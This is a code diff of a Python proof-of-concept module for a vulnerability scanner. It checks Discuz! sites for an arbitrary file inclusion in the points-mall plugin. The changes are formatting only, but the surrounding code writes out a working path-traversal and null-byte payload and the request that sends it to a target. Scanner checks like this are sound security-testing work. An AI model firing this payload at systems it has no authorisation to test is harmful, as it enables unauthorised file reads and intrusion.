@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0022'  # 平台漏洞编号，留空
     name = 'Discuz!积分商城插件任意文件包含'  # 漏洞名称
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     product = 'Discuz!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '5290293e-54a1-4a9b-8ef2-7718e66997c3'
     author = '47bwy'  # POC编写者
@@ -32,10 +34,10 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #_Refer_ = http://www.wooyun.org/bugs/wooyun-2015-0131386
+            # _Refer_ = http://www.wooyun.org/bugs/wooyun-2015-0131386
             payload = '/plugin.php?action=../../../../../robots.txt%00&id=dc_mall'
             verify_url = self.target + payload
-            
+
             req = requests.get(verify_url)
             if req.status_code == 200 and "User-agent" in req.content and 'robots.txt for Discuz' in req.content and 'Disallow:' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
